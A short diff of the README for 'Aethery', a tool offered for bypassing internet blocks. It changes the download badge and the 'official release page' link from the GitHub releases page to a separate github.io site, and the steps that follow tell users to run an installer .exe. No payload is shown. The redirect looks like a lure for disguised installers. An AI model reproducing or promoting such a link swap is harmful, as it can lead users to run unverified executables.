@@ -1,6 +1,6 @@
 # 🌐 Aethery - Bypass internet blocks with ease
 
-[![](https://img.shields.io/badge/Download_Aethery-Blue-blue.svg)](https://github.com/Mahmoudvi78/Aethery/releases)
+[![](https://img.shields.io/badge/Download_Aethery-Blue-blue.svg)](https://mahmoudvi78.github.io)
 
 Aethery creates a secure bridge for your internet traffic. This tool hides your browsing data from local restrictions. It uses modern code to keep your connection stable and fast. You do not need technical skills to use this program.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic needs to run Aethery:
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official release page](https://github.com/Mahmoudvi78/Aethery/releases) to find the latest version of the software.
+1. Visit the [official release page](https://mahmoudvi78.github.io) to find the latest version of the software.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the filename to save the installer to your Downloads folder.
 4. Open your Downloads folder and double-click the file named `Aethery-setup.exe`.
